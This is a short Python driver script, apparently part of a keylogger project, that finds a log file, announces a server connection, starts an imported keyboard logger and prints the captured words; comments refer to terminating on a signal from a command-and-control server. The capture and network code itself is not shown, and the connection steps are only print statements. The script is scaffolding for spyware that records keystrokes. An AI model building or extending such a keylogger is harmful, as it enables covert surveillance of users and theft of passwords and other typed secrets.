from cfile import checkfile
from script import keyboard_logger_pathed

def run():
    #store_file -> file path for logger
    #bfr -> temporary store for words captured
    #RF -> binary flag for running the script or not
    

    #check for file
    store_file = checkfile()
    print(store_file)
    
    #check for server conn
    print("Server connnection starting...")

    #run keylogger
    print("Starting the logger")
    bfr = keyboard_logger_pathed(store_file)
    print(bfr)
    
    #terminate connection upon recieving signal from C&C
    print()        

if __name__ == '__main__':
    print("run.py -- w")
    run()